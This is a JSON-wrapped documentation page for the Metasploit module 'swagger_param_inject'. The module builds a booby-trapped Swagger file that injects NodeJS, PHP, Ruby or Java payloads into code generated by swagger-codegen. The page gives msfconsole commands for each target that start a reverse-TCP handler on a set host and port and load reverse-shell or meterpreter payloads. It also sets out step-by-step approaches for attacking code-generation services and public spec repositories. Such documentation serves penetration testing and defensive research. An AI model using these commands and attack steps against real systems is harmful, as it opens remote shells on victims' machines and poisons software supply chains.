{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/fileformat/swagger_param_inject","result":{"data":{"moduleMetadataJson":{"id":"48e7ab92-7d56-525e-b320-3888fde020b9","name":"JSON Swagger CodeGen Parameter Injector","fullname":"exploit/multi/fileformat/swagger_param_inject","description":"This module generates an Open API Specification 2.0 (Swagger) compliant\n        json document that includes payload insertion points in parameters.\n\n        In order for the payload to be executed, an attacker must convince\n        someone to generate code from a specially modified swagger.json file\n        within a vulnerable swagger-codgen appliance/container/api/service,\n        and then to execute that generated code (or include it into software\n        which will later be executed by another victim). By doing so, an\n        attacker can execute arbitrary code as the victim user. The same\n        vulnerability exists in the YAML format.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/fileformat/swagger_param_inject","documentationSlug":"/modules/documentation/exploit/multi/fileformat/swagger_param_inject"},"documentation":{"html":"<p>The <a href=\"../../../../../../metasploit-framework/modules/exploits/multi/fileformat/swagger_param_inject.rb\">Swagger CodeGen parameter injector module</a> generates a Swagger JSON file with embedded Metasploit payloads.</p>\n<p>In the typical case, a Swagger document defines an API.  Swagger can be automatically consumed to generate client/server code, testing and scaffolding in APIs by companies eager to provide value to the increasing need for scalable API deployment and testing.</p>\n<p>Currently, this module supports 4 languages for delivery: NodeJS, PHP, Ruby, and Java.  These are specified by the PAYLOAD set for the exploit module.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>All exploits assume a bind or reverse-tcp callback handler, with preference on reverse-tcp. </p>\n<ol>\n<li>Start msfconsole</li>\n<li>Start a callback handler listening for a the appropriate payload (e.g.)</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/multi/handler  \nset PAYLOAD nodejs/shell_reverse_tcp\n\nset LHOST 192.168.68.138 \nset LPORT 4444\n\nrun </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"3\">\n<li>Pick a target </li>\n</ol>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<p><strong>NodeJS</strong> </p>\n<p>This attack injects a payload into javascript by terminating a URL path string.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/multi/fileformat/swagger_param_inject\nset TARGET 0\nset PAYLOAD nodejs/shell_reverse_tcp\nset INFO_VERSION &quot;1.0.0&quot;\nset SWAGGER_HOST &quot;localhost&quot;\nrun </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>PHP</strong> </p>\n<p>This attack injects a payload into PHP multiline comment area.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/multi/fileformat/swagger_param_inject\nset TARGET 1\nset PAYLOAD php/meterpreter/reverse_tcp \nset SWAGGER_HOST &quot;localhost&quot;\nrun </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>ruby</strong> </p>\n<p>This attack injects a payload into ruby multiline comment area.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/multi/fileformat/swagger_param_inject\nset TARGET 3\nset PAYLOAD ruby/shell_reverse_tcp \nset SWAGGER_HOST &quot;localhost&quot;\nrun </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Java</strong> </p>\n<p>This attack injects a payload into Java by terminating a URL path string.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/multi/fileformat/swagger_param_inject\nset TARGET 2\nset PAYLOAD java/jsp_shell_reverse_tcp \nset SWAGGER_HOST &quot;localhost&quot;\nrun </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"quick-test\" style=\"position:relative;\"><a href=\"#quick-test\" aria-label=\"quick test permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Quick Test</h2>\n<p>Use the online <a href=\"http://editor.swagger.io\">editor.swagger.io</a> to upload your swagger document, and generate pre-built code bases from the document.  The swagger editor leverages <a href=\"http://generator.swagger.io\">generator.swagger.io</a> to build these clients &#x26; servers automatically from the document, and published downloadable artifacts of these code bases.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Effective against services with either these dependencies</p>\n<ul>\n<li><a href=\"https://github.com/swagger-api/swagger-codegen\">swagger-codegen</a></li>\n<li>public API <a href=\"http://generator.swagger.io/\">generator.swagger.io</a></li>\n<li>public docker container <a href=\"https://hub.docker.com/r/swaggerapi/swagger-generator/\">swagger-generator/</a></li>\n<li><a href=\"https://github.com/apigee-127/swagger-test-templates\">swagger-test-templates</a></li>\n</ul>\n<p><strong>Possible Attack approach.</strong></p>\n<ol>\n<li>Research the target environment and component dependencies.  </li>\n<li>Setup appropriate payload callback listener.</li>\n<li>generate the appropriate swagger document with associated MS payload (see above for examples)</li>\n</ol>\n<p><strong>Against a webservice (2nd order attack / blind code-gen)</strong></p>\n<p><em>Who knows what insecurely configured code-gen Docker containers hosted in data compute or API broker cluster could do if given the chance...</em></p>\n<ol start=\"4\">\n<li>Feed the document to the service in service appropriate submission of Swagger documents.  This is most often accoplished by defining a Mock, Test or Pass-Thru service automatically constructed by the swagger document definition.</li>\n<li>Wait for callback handler event.  </li>\n</ol>\n<p><strong>Against a code repository or public hosting of spec</strong></p>\n<p><em>People and Robots trust swagger to build clients, servers, mocks, and more.  Publicly hosted specs should be verified as to not corrupt automatic code generation.</em></p>\n<ol start=\"4\">\n<li>Feed the document to the service in service appropriate submission of Swagger documents.  This is most often accoplished by defining a Mock, Test or Pass-Thru service automatically constructed by the swagger document definition.</li>\n<li>Wait for callback handler event.  </li>\n</ol>"}}},"pageContext":{"id":"48e7ab92-7d56-525e-b320-3888fde020b9"}}}